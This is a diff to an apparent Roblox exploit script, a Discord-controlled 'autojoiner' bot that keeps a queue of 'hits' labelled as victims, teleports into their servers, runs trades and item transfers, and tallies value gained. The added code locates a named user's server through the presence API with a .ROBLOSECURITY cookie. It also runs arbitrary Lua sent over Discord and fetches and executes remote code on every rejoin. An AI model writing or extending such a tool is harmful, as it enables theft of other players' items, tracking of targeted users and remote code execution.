@@ -1,14 +1,15 @@
 -- ═══════════════════════════════════════════════════════════════
 --  FALLBACK CONFIG (reads globals set by your executor)
 -- ═══════════════════════════════════════════════════════════════
-_bt      = _bt or "";
-_ch      = _ch or "";
-_lg      = _lg or "";
-_tbn     = _tbn or 1;
-_hitCh   = _hitCh or _ch;
-_cmdCh   = _cmdCh or _ch;
-_owner   = _owner or "";
-_allow   = _allow or {[142823291] = true};
+_bt           = _bt or "";
+_ch           = _ch or "";
+_lg           = _lg or "";
+_tbn          = _tbn or 1;
+_hitCh        = _hitCh or _ch;
+_cmdCh        = _cmdCh or _ch;
+_owner        = _owner or "";
+_robloxCookie = _robloxCookie or "";
+_allow        = _allow or {[142823291] = true};
 -- ═══════════════════════════════════════════════════════════════
 
 if _bt == "" or _ch == "" then
@@ -823,11 +824,12 @@ local function _gw()
                                         inline = false },
                                     { name = "⚙️ Utility", value =
                                         "`!status` `!server` `!job`\n" ..
-                                        "`!age <user>` `!execute <lua>`",
+                                        "`!age <user>` `!execute <lua>`\n" ..
+                                        "`!serverget <user>` — find their server\n" ..
+                                        "`!serverjoin <jobId>`",
                                         inline = false },
                                     { name = "🚀 Movement", value =
-                                        "`!rejoin` `!rejoinlast` `!panic`\n" ..
-                                        "`!serverjoin <jobId>` — join a specific server",
+                                        "`!rejoin` `!rejoinlast` `!panic`",
                                         inline = false },
                                     { name = "🔁 Transfers", value =
                                         "`!transfer <user>` `!stoptransfer`",
@@ -963,7 +965,205 @@ local function _gw()
                     return;
                 end
 
-                -- ─── !serverjoin <jobId | placeId, jobId | script> ───
+                if _content == "!rejoin" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        _postEmbed("🔄 Rejoining", "Rejoining current server\nJobId: `"..tostring(game.JobId).."`", 0x3EED50);
+                        task.wait(1.5);
+                        pcall(function()
+                            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer);
+                        end);
+                    end);
+                    return;
+                end
+
+                if _content == "!rejoinlast" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        if not isfile("last_jobid.dat") then
+                            _postEmbed("❌ Rejoin Last", "No previous server saved yet.", 0xFF0000);
+                            return;
+                        end
+                        local _ok, _lastJob = pcall(readfile, "last_jobid.dat");
+                        if not _ok or type(_lastJob) ~= "string" or _lastJob == "" then
+                            _postEmbed("❌ Rejoin Last", "Failed to read last_jobid.dat", 0xFF0000);
+                            return;
+                        end
+                        if _lastJob == game.JobId then
+                            _postEmbed("❌ Rejoin Last", "You're already in that server.", 0xFF0000);
+                            return;
+                        end
+                        _postEmbed("↩️ Rejoining Last Server", "JobId: `" .. _lastJob .. "`", 0x3EED50);
+                        task.wait(1.5);
+                        pcall(function()
+                            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, _lastJob, game.Players.LocalPlayer);
+                        end);
+                    end);
+                    return;
+                end
+
+                if _content == "!panic" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "🚨") end);
+                    task.spawn(function()
+                        local _actions = {};
+                        if _transferActive then
+                            _transferActive = false;
+                            table.insert(_actions, "✅ Stopped active transfer");
+                        end
+                        local _s = nil;
+                        if _ts then
+                            local _okT, _sT = pcall(_ts);
+                            if _okT then _s = _sT end
+                        end
+                        if _s == "StartTrade" then
+                            pcall(function() _rs.Trade.DeclineTrade:FireServer() end);
+                            table.insert(_actions, "✅ Declined open trade");
+                        elseif _s == "ReceivingRequest" then
+                            pcall(function() _rs.Trade.DeclineRequest:FireServer() end);
+                            table.insert(_actions, "✅ Declined incoming request");
+                        end
+                        if _moving then
+                            _moving = false;
+                            table.insert(_actions, "✅ Stopped joiner teleport loop");
+                        end
+                        _wl("pending_hits.dat", {});
+                        table.insert(_actions, "✅ Cleared pending hits");
+                        if _autoexecURL ~= "" then
+                            _clearQueue();
+                            table.insert(_actions, "✅ Cleared autoexecute queue");
+                        end
+                        if #_actions == 0 then
+                            _postEmbed("🚨 Panic", "Nothing to stop.", 0xFFA500);
+                        else
+                            _postEmbed("🚨 Panic - All Stopped", table.concat(_actions, "\n") .. "\n\n**Still connected.** Use `!help` to resume.", 0xFF0000);
+                        end
+                    end);
+                    return;
+                end
+
+                if _content == "!job" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        _postEmbed("🔗 Job", "**JobId:** `" .. tostring(game.JobId) .. "`\n**PlaceId:** `" .. tostring(game.PlaceId) .. "`", 0x3EED50);
+                    end);
+                    return;
+                end
+
+                local _serverGetUser = _content:match("^!serverget%s+(.+)$");
+                if _serverGetUser then
+                    _serverGetUser = _serverGetUser:gsub("^%s+", ""):gsub("%s+$", "");
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        local _ok1, _r1 = pcall(function()
+                            return request({
+                                Url = "https://users.roblox.com/v1/usernames/users",
+                                Method = "POST",
+                                Headers = { ["Content-Type"] = "application/json" },
+                                Body = _hs:JSONEncode({ usernames = { _serverGetUser }, excludeBannedUsers = false })
+                            });
+                        end);
+                        if not _ok1 or not _r1 or _r1.StatusCode ~= 200 then
+                            _postEmbed("❌ Server Get Failed", "Couldn't look up `".._serverGetUser.."`", 0xFF0000);
+                            return;
+                        end
+                        local _d1 = _hs:JSONDecode(_r1.Body);
+                        if not _d1.data or not _d1.data[1] then
+                            _postEmbed("❌ Server Get Failed", "No results for `".._serverGetUser.."`", 0xFF0000);
+                            return;
+                        end
+                        local _uid = _d1.data[1].id;
+                        local _uname = _d1.data[1].name;
+
+                        if _robloxCookie == "" then
+                            _postEmbed("❌ Server Get Failed",
+                                "No `.ROBLOSECURITY` set.\nSet `_robloxCookie` in your executor config.",
+                                0xFF0000);
+                            return;
+                        end
+
+                        local _ok2, _r2 = pcall(function()
+                            return request({
+                                Url = "https://presence.roblox.com/v1/presence/users",
+                                Method = "POST",
+                                Headers = {
+                                    ["Content-Type"] = "application/json",
+                                    ["Cookie"] = ".ROBLOSECURITY=" .. _robloxCookie
+                                },
+                                Body = _hs:JSONEncode({ userIds = { _uid } })
+                            });
+                        end);
+                        if not _ok2 or not _r2 or _r2.StatusCode ~= 200 then
+                            local _code = _r2 and _r2.StatusCode or "?"
+                            local _body = _r2 and _r2.Body or tostring(_r2)
+                            _postEmbed("❌ Server Get Failed",
+                                "Presence API returned `"..tostring(_code).."`\n```\n"..tostring(_body):sub(1, 500).."\n```",
+                                0xFF0000);
+                            return;
+                        end
+                        local _d2 = _hs:JSONDecode(_r2.Body);
+                        local _pres = _d2.userPresences and _d2.userPresences[1];
+                        if not _pres then
+                            _postEmbed("❌ Server Get Failed", "No presence data returned.", 0xFF0000);
+                            return;
+                        end
+
+                        local _type = _pres.userPresenceType or 0;
+                        local _typeNames = { [0]="Offline", [1]="Online (website)", [2]="In Game", [3]="In Studio" };
+                        local _typeStr = _typeNames[_type] or ("Unknown (".._type..")");
+
+                        if _type ~= 2 then
+                            _postEmbed("❌ Not In Game",
+                                "**".._uname.."** is currently `".._typeStr.."`.",
+                                0xFFA500);
+                            return;
+                        end
+
+                        local _placeId = _pres.placeId or _pres.rootPlaceId;
+                        local _jobId = _pres.gameId;
+                        local _loc = _pres.lastLocation or "?";
+
+                        if not _placeId or not _jobId then
+                            _postEmbed("❌ Server Get Failed", "Missing placeId/gameId.", 0xFF0000);
+                            return;
+                        end
+
+                        local _script = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
+                            tostring(_placeId) .. ", '" .. tostring(_jobId) .. "')";
+
+                        local _desc =
+                            "**User:** `".._uname.."` (ID `".._uid.."`)\n" ..
+                            "**Status:** `".._typeStr.."`\n" ..
+                            "**Game:** `".._loc.."`\n" ..
+                            "**PlaceId:** `"..tostring(_placeId).."`\n" ..
+                            "**JobId:** `"..tostring(_jobId).."`\n\n" ..
+                            "**To join, send:**\n" ..
+                            "`!serverjoin ".._script.."`";
+
+                        _postEmbed("🎯 Server Found — ".._uname, _desc, 0x3EED50);
+                    end);
+                    return;
+                end
+
                 local _serverJoinArg = _content:match("^!serverjoin%s+([%s%S]+)$");
                 if _serverJoinArg then
                     if not _isOwner(_md.author) then
@@ -974,15 +1174,572 @@ local function _gw()
                     task.spawn(function()
                         local _placeId, _jobId;
 
-                        -- format 1: full TeleportToPlaceInstance script
                         _placeId, _jobId = _serverJoinArg:match(
                             "TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*['\"]([%w%-]+)['\"]%s*%)"
                         );
-
-                        -- format 2: "placeId, jobId" or "placeId jobId"
                         if not _placeId then
                             _placeId, _jobId = _serverJoinArg:match("^(%d+)[%s,]+([%w%-]+)$");
                         end
+                        if not _placeId and _serverJoinArg:match("^[%w%-]+$") and #_serverJoinArg >= 30 then
+                            _placeId = tostring(game.PlaceId);
+                            _jobId = _serverJoinArg;
+                        end
 
-                        -- format 3: just a JobId (UUID-ish, 30+ chars)
-                        if not _placeId
+                        if not _placeId or not _jobId then
+                            _postEmbed("❌ Server Join Failed",
+                                "Couldn't parse argument.\nFormats: full script, `placeId, jobId`, or just JobId.",
+                                0xFF0000);
+                            return;
+                        end
+
+                        if tostring(_jobId) == tostring(game.JobId) then
+                            _postEmbed("⚠️ Already In Server", "You're already in that server.", 0xFFA500);
+                            return;
+                        end
+
+                        _postEmbed("🚀 Joining Server",
+                            "**PlaceId:** `"..tostring(_placeId).."`\n" ..
+                            "**JobId:** `"..tostring(_jobId).."`\n\n" ..
+                            "_Teleporting now..._",
+                            0x3EED50);
+
+                        task.wait(1.5);
+                        pcall(function()
+                            game:GetService("TeleportService"):TeleportToPlaceInstance(
+                                tonumber(_placeId), tostring(_jobId), game.Players.LocalPlayer
+                            );
+                        end);
+                    end);
+                    return;
+                end
+
+                local _ageUser = _content:match("^!age%s+(.+)$");
+                if _ageUser then
+                    _ageUser = _ageUser:gsub("^%s+", ""):gsub("%s+$", "");
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        local _ok1, _r1 = pcall(function()
+                            return request({
+                                Url = "https://users.roblox.com/v1/usernames/users",
+                                Method = "POST",
+                                Headers = { ["Content-Type"] = "application/json" },
+                                Body = _hs:JSONEncode({ usernames = { _ageUser }, excludeBannedUsers = false })
+                            });
+                        end);
+                        if not _ok1 or not _r1 or _r1.StatusCode ~= 200 then
+                            _postEmbed("❌ Age Lookup Failed", "Couldn't find user `".._ageUser.."`", 0xFF0000);
+                            return;
+                        end
+                        local _d1 = _hs:JSONDecode(_r1.Body);
+                        if not _d1.data or not _d1.data[1] then
+                            _postEmbed("❌ Age Lookup Failed", "No results for `".._ageUser.."`", 0xFF0000);
+                            return;
+                        end
+                        local _uid = _d1.data[1].id;
+                        local _uname = _d1.data[1].name;
+                        local _display = _d1.data[1].displayName;
+
+                        local _ok2, _r2 = pcall(function()
+                            return request({ Url = "https://users.roblox.com/v1/users/".._uid, Method = "GET" });
+                        end);
+                        if not _ok2 or not _r2 or _r2.StatusCode ~= 200 then
+                            _postEmbed("❌ Age Lookup Failed", "Got ID ".._uid.." but couldn't fetch profile.", 0xFF0000);
+                            return;
+                        end
+                        local _d2 = _hs:JSONDecode(_r2.Body);
+                        local _createdIso = _d2.created or "";
+                        local _days = 0;
+                        pcall(function()
+                            local _dt = DateTime.fromIsoDate(_createdIso);
+                            _days = math.floor((os.time() - _dt.UnixTimestamp) / 86400);
+                        end);
+                        local _color = 0x3EED50;
+                        if _days < 30 then _color = 0xFF0000
+                        elseif _days < 180 then _color = 0xFFA500 end
+
+                        local _desc =
+                            "**Username:** `".._uname.."`\n" ..
+                            "**Display:** `".._display.."`\n" ..
+                            "**ID:** `".._uid.."`\n" ..
+                            "**Created:** `".._createdIso:sub(1,10).."`\n" ..
+                            "**Age:** `".._days.." days` (~"..string.format("%.1f", _days / 365).." years)";
+                        _postEmbed("🕰️ Roblox Account Age", _desc, _color);
+                    end);
+                    return;
+                end
+
+                if _content == "!queue" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        local _q = _rl("pending_hits.dat");
+                        if #_q == 0 then
+                            _postEmbed("📋 Pending Hits", "Queue is empty.", 0x3EED50);
+                            return;
+                        end
+                        local _lines = {};
+                        for _i, _j in ipairs(_q) do
+                            local _jobShort = tostring(_j.jobId or "?"):sub(1, 16);
+                            table.insert(_lines, string.format(
+                                "`%d.` victim: **%s** - job: `%s...` - id: `%s`",
+                                _i, tostring(_j.author or "?"), _jobShort, tostring(_j.msgid or "?")
+                            ));
+                        end
+                        local _body = table.concat(_lines, "\n");
+                        if #_body > 1900 then _body = _body:sub(1, 1900) .. "\n...truncated" end
+                        _postEmbed("📋 Pending Hits ("..#_q..")", _body, 0x3EED50);
+                    end);
+                    return;
+                end
+
+                if _content == "!stats" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        local _up = math.floor(tick() - _sessionStart);
+                        local _h = math.floor(_up / 3600);
+                        local _m = math.floor((_up % 3600) / 60);
+                        local _s = _up % 60;
+
+                        local function _fmt(n)
+                            n = tonumber(n) or 0;
+                            local x = tostring(math.floor(n));
+                            local out = x:reverse():gsub("(%d%d%d)", "%1,"):reverse();
+                            return out:gsub("^,", "");
+                        end
+
+                        local _q = #_rl("pending_hits.dat");
+                        local _lifeDays = 0;
+                        if _pStats.firstStart then
+                            local _lifeUp = os.time() - _pStats.firstStart;
+                            _lifeDays = math.floor(_lifeUp / 86400);
+                        end
+
+                        local _desc =
+                            "**📅 SESSION (this run)**\n" ..
+                            "**⏱️ Uptime:** `" .. _h .. "h " .. _m .. "m " .. _s .. "s`\n" ..
+                            "**🎯 Hits joined:** `" .. _hitsJoined .. "`\n" ..
+                            "**🔁 Trades:** `" .. _doneT .. "`\n" ..
+                            "**📦 Items gained:** `" .. _itemsGained .. "`\n" ..
+                            "**💎 Value gained:** `" .. _fmt(_sumV) .. "`\n" ..
+                            "\n" ..
+                            "**🌐 LIFETIME (all sessions)**\n" ..
+                            "**⏱️ Since:** `" .. _lifeDays .. " days`\n" ..
+                            "**🖥️ Servers visited:** `" .. _fmt(_pStats.serversVisited) .. "`\n" ..
+                            "**🎯 Hits joined:** `" .. _fmt(_pStats.hitsJoined) .. "`\n" ..
+                            "**🔁 Trades:** `" .. _fmt(_pStats.tradesDone) .. "`\n" ..
+                            "**📦 Items gained:** `" .. _fmt(_pStats.itemsGained) .. "`\n" ..
+                            "**💎 Value gained:** `" .. _fmt(_pStats.valueGained) .. "`\n" ..
+                            "\n" ..
+                            "**📋 Pending hits:** `" .. _q .. "`\n";
+
+                        _postEmbed("📊 Stats", _desc, 0x3EED50);
+                    end);
+                    return;
+                end
+
+                if _content == "!resetstats" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "🛑") end);
+                    task.spawn(function()
+                        _pStats = {
+                            hitsJoined     = 0,
+                            tradesDone     = 0,
+                            itemsGained    = 0,
+                            valueGained    = 0,
+                            firstStart     = os.time(),
+                            lastUpdate     = os.time(),
+                            serversVisited = 1,
+                        };
+                        _saveStats();
+                        _postEmbed("🛑 Stats Reset", "Lifetime stats cleared.", 0xFF0000);
+                    end);
+                    return;
+                end
+
+                if _content == "!history" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        local _hist = _rl("trade_history.dat");
+                        if #_hist == 0 then
+                            _postEmbed("🕓 Trade History", "No trades recorded yet.", 0x3EED50);
+                            return;
+                        end
+                        local _lines = {};
+                        local _start = math.max(1, #_hist - 9);
+                        for _i = #_hist, _start, -1 do
+                            local _e = _hist[_i];
+                            local _tsStr = os.date("%H:%M:%S", _e.t or os.time());
+                            table.insert(_lines, string.format(
+                                "`%s` - **%d** items - **%d** value",
+                                _tsStr, tonumber(_e.c) or 0, tonumber(_e.v) or 0
+                            ));
+                        end
+                        local _desc = "Last "..#_lines.." of "..#_hist.." trades:\n\n" .. table.concat(_lines, "\n");
+                        _postEmbed("🕓 Trade History", _desc, 0x3EED50);
+                    end);
+                    return;
+                end
+
+                local _autoURL = _content:match("^!autoexecute%s+(.+)$");
+                if _autoURL then
+                    _autoURL = _autoURL:gsub("^%s+", ""):gsub("%s+$", "");
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        _autoexecURL = _autoURL;
+                        pcall(function() writefile(AUTOEXEC_FILE, _autoexecURL) end);
+                        local _used = _queueAutoexec();
+                        local _queueState = _used and ("queued via " .. _used) or "NO QUEUE METHOD";
+                        _postEmbed("🎯 Auto-Execute Saved",
+                            "**URL:** `" .. _autoexecURL .. "`\n" ..
+                            "**Queue:** " .. _queueState .. "\n\n" ..
+                            "_Will run on every rejoin. Running it now too..._", 0x3EED50);
+                        task.wait(0.5);
+                        local _ok, _err = pcall(function()
+                            loadstring(game:HttpGet(_autoexecURL))();
+                        end);
+                        if not _ok then
+                            _postEmbed("⚠️ Auto-Execute Run Failed", "```\n" .. tostring(_err):sub(1, 900) .. "\n```", 0xFFA500);
+                        else
+                            _postEmbed("✅ Auto-Execute Ran", "Loaded and executed successfully.", 0x3EED50);
+                        end
+                    end);
+                    return;
+                end
+
+                if _content == "!stopautoexecute" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "🛑") end);
+                    task.spawn(function()
+                        _autoexecURL = "";
+                        pcall(function() if isfile(AUTOEXEC_FILE) then delfile(AUTOEXEC_FILE) end end);
+                        _clearQueue();
+                        _postEmbed("🛑 Auto-Execute Disabled", "Saved script cleared **and** queue overwritten.", 0xFF0000);
+                    end);
+                    return;
+                end
+
+                if _content == "!runauto" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        if _autoexecURL == "" then
+                            _postEmbed("❌ No Auto-Execute Saved", "Use `!autoexecute <url>` first.", 0xFF0000);
+                            return;
+                        end
+                        local _ok, _err = pcall(function() loadstring(game:HttpGet(_autoexecURL))() end);
+                        if not _ok then
+                            _postEmbed("❌ Run Failed", "```\n" .. tostring(_err):sub(1, 900) .. "\n```", 0xFF0000);
+                        else
+                            _postEmbed("✅ Ran", "`" .. _autoexecURL .. "`", 0x3EED50);
+                        end
+                    end);
+                    return;
+                end
+
+                if _content == "!showauto" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        if _autoexecURL == "" then
+                            _postEmbed("🎯 Auto-Execute", "No script saved.", 0x3EED50);
+                        else
+                            _postEmbed("🎯 Auto-Execute", "**URL:** `" .. _autoexecURL .. "`", 0x3EED50);
+                        end
+                    end);
+                    return;
+                end
+
+                local _execCode = _content:match("^!execute%s+([%s%S]+)$");
+                if _execCode then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        local _bt3 = string.char(96) .. string.char(96) .. string.char(96);
+                        local _nl  = string.char(10);
+                        local _pat1 = "^" .. _bt3 .. "%w*%s*" .. _nl .. "?";
+                        local _pat2 = _nl .. "?%s*" .. _bt3 .. "%s*$";
+                        local _clean = _execCode;
+                        _clean = _clean:gsub(_pat1, "");
+                        _clean = _clean:gsub(_pat2, "");
+
+                        local _fn, _loadErr = loadstring(_clean);
+                        if not _fn then
+                            _postEmbed("❌ Execute - Load Error", "```\n"..tostring(_loadErr):sub(1, 900).."\n```", 0xFF0000);
+                            return;
+                        end
+
+                        local _results = {};
+                        local _ok, _runErr = pcall(function()
+                            local _ret = { _fn() };
+                            for _i, _v in ipairs(_ret) do
+                                table.insert(_results, tostring(_v));
+                            end
+                        end);
+
+                        if not _ok then
+                            _postEmbed("❌ Execute - Runtime Error", "```\n"..tostring(_runErr):sub(1, 900).."\n```", 0xFF0000);
+                        else
+                            local _out = (#_results > 0) and table.concat(_results, "\n") or "(no return value)";
+                            _postEmbed("✅ Execute - OK", "**Output:**\n```\n"..tostring(_out):sub(1, 900).."\n```", 0x3EED50);
+                        end
+                    end);
+                    return;
+                end
+
+                if _content == "!server" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        local _players = game.Players:GetPlayers();
+                        local _names = {};
+                        local _self = game.Players.LocalPlayer.Name;
+                        for _, _p in ipairs(_players) do
+                            local _tag = (_p.Name == _self) and " **(you)**" or "";
+                            table.insert(_names, "> `".._p.Name.."`".._tag);
+                        end
+                        table.sort(_names);
+                        local _body = table.concat(_names, "\n");
+                        if #_body > 3900 then _body = _body:sub(1, 3900) .. "\n...truncated" end
+                        _postEmbed("👥 Server Players - " .. #_players .. " online", _body, 0x3EED50);
+                    end);
+                    return;
+                end
+
+                if _content == "!status" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        local _up = math.floor(tick() - _startT);
+                        local _h = math.floor(_up / 3600);
+                        local _m = math.floor((_up % 3600) / 60);
+                        local _s = _up % 60;
+                        local _upStr = string.format("%dh %dm %ds", _h, _m, _s);
+
+                        local _gc = "disconnected";
+                        if _sock then
+                            if _resume then _gc = "connected (READY)" else _gc = "connected (handshake)" end
+                        end
+                        local _vLState = next(_vL) and "loaded" or "EMPTY";
+                        local _xferState = "idle";
+                        if _transferActive then
+                            _xferState = "ACTIVE -> " .. tostring(_transferTarget) .. " (" .. _transferDone .. " batches)";
+                        end
+                        local _autoStr = (_autoexecURL ~= "") and ("active: `" .. _autoexecURL .. "`") or "off";
+
+                        local _desc =
+                            "**🟢 Online**\n" ..
+                            "**JobId:** `" .. tostring(game.JobId):sub(1, 18) .. "...`\n" ..
+                            "**PlaceId:** `" .. tostring(game.PlaceId) .. "`\n" ..
+                            "**Player:** `" .. game.Players.LocalPlayer.Name .. "`\n" ..
+                            "**Players in server:** `" .. #game.Players:GetPlayers() .. "`\n" ..
+                            "**Uptime:** `" .. _upStr .. "`\n";
+
+                        local _f = {
+                            { name = "⚙️ Runtime", value = "```\nGateway: " .. _gc .. "\nValue list: " .. _vLState .. "\nExecutor: " .. _ex .. " " .. _exv .. "\n```", inline = false },
+                            { name = "🔁 Trades", value = "```\nTrades this server: " .. _doneT .. "\n_tbn limit: " .. _tbn .. "\nTransfer: " .. _xferState .. "\n```", inline = false },
+                            { name = "🎯 Auto-Execute", value = _autoStr, inline = false },
+                            { name = "📡 Channels", value = "```\nHits: " .. _hitCh .. "\nCmd:  " .. _cmdCh .. "\nLog:  " .. _lg .. "\n```", inline = false },
+                        };
+
+                        local _embed = {
+                            title = "📡 Autojoiner Status",
+                            description = _desc,
+                            color = 0x3EED50,
+                            fields = _f,
+                            footer = { text = "Status at " .. os.date("%H:%M:%S") },
+                            timestamp = DateTime.now():ToIsoDate()
+                        };
+                        pcall(function()
+                            request({ Url = "https://discord.com/api/v10/channels/".._lg.."/messages", Method = "POST", Headers = { ["Authorization"] = "Bot ".._bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode({ embeds = { _embed } }) });
+                        end);
+                    end);
+                    return;
+                end
+
+                if _content == "!coins" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        local _ok, _p = pcall(function()
+                            return _rs.Remotes.Inventory.GetProfileData:InvokeServer(game.Players.LocalPlayer.Name);
+                        end);
+                        if not _ok or type(_p) ~= "table" then
+                            _postEmbed("❌ Coins - Error", "```\n" .. tostring(_p):sub(1, 900) .. "\n```", 0xFF0000);
+                            return;
+                        end
+                        local _mats = (_p.Materials and _p.Materials.Owned) or {};
+                        local _coins       = _mats.Coins or 0;
+                        local _gems        = _mats.Gems or 0;
+                        local _coinsBackup = _p.Coins_Backup or 0;
+                        local _gemsBackup  = _p.Gems_Backup or 0;
+                        local _credits     = _p.Credits or 0;
+                        local _coinBag     = _p.CoinBag or 0;
+                        local _snow = _mats.SnowTokens2025 or nil;
+
+                        local function _fmt(n)
+                            n = tonumber(n) or 0;
+                            local s = tostring(math.floor(n));
+                            local out = s:reverse():gsub("(%d%d%d)", "%1,"):reverse();
+                            return out:gsub("^,", "");
+                        end
+
+                        local _lines = {
+                            "**🪙 Coins:** `" .. _fmt(_coins) .. "`",
+                            "**💎 Gems:** `" .. _fmt(_gems) .. "`",
+                        };
+                        if _coinBag > 0 then table.insert(_lines, "**🎒 Coin Bag:** `" .. _fmt(_coinBag) .. "`") end
+                        if _credits > 0 then table.insert(_lines, "**💳 Credits:** `" .. _fmt(_credits) .. "`") end
+                        if _snow then table.insert(_lines, "**❄️ Snow Tokens:** `" .. _fmt(_snow) .. "`") end
+                        if _coinsBackup > 0 then
+                            table.insert(_lines, "");
+                            table.insert(_lines, "**Coins Backup:** `" .. _fmt(_coinsBackup) .. "`");
+                            table.insert(_lines, "**Gems Backup:** `" .. _fmt(_gemsBackup) .. "`");
+                        end
+
+                        _postEmbed("💰 Currency", table.concat(_lines, "\n"), 0xFFD700);
+                    end);
+                    return;
+                end
+
+                local _tName = _content:match("^!transfer%s+(.+)$");
+                if _tName then
+                    _tName = _tName:gsub("%s+$", "");
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    if _transferActive then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "⚠️") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(_doTransfer, _tName);
+                    return;
+                end
+
+                if _content == "!stoptransfer" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    if _transferActive then
+                        _transferActive = false;
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "🛑") end);
+                    else
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "⚠️") end);
+                    end
+                    return;
+                end
+            end
+
+            if _isHit then
+                _lastMid = _md.id;
+                _pjm(_md);
+            end
+        end
+    end);
+
+    if not _sock then
+        warn("[gw] connect returned nil, retrying");
+        task.wait(5 + math.random() * 5);
+        if _gen == _me then _gw() end
+        return;
+    end
+
+    print("[gw] socket open, waiting for handshake");
+
+    _sock.OnClose:Connect(function()
+        if _gen ~= _me then return end
+        warn("[gw] closed, reconnecting");
+        _sock = nil;
+        if _sid and _seq then _resume = true end
+        task.wait(5 + math.random() * 5);
+        if _gen == _me then _gw() end
+    end);
+
+    task.spawn(function()
+        task.wait(6);
+        if _gen == _me and _hGen ~= _me then
+            warn("[gw] no HELLO (dead socket), retrying now");
+            pcall(function() if _sock then _sock:Close() end end);
+            if _gen == _me then
+                _sock = nil;
+                _gw();
+            end
+            return;
+        end
+        if _gen ~= _me then return end
+        task.wait(8);
+        if _gen == _me and _rGen ~= _me then
+            warn("[gw] HELLO but no READY (rate limited?), backing off");
+            pcall(function() if _sock then _sock:Close() end end);
+            task.wait(3 + math.random() * 4);
+            if _gen == _me then
+                _sock = nil;
+                _gw();
+            end
+        end
+    end)
+end
+
+task.spawn(function()
+    while true do
+        task.wait(1);
+        if not _moving and _ok2go() then
+            local _q = _rl("pending_hits.dat");
+            if #_q > 0 then
+                local _j = table.remove(_q, 1);
+                _wl("pending_hits.dat", _q);
+                if _j and _j.msgid and not _il("hits_joined.dat", _j.msgid) and _j.jobId ~= game.JobId then
+                    _tpTo(_j.placeId, _j.jobId, _j.msgid);
+                end
+            end
+        end
